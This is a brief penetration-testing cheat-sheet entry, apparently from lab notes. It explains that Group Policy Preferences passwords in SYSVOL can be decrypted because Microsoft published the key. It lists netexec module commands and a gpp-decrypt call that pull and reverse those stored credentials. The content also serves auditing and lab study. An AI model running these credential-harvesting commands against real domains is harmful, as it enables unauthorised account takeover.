 

What & why

**Older admins set local passwords through "Group Policy Preferences" (GPP),** and Windows stored them — encrypted — in a share that every domain user can read (SYSVOL). The fatal flaw: Microsoft once published the decryption key, so `gpp-decrypt` instantly reverses them into plaintext. If GPP passwords exist, they're free credentials. Always check.

```
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
gpp-decrypt <CPASSWORD_VALUE>
```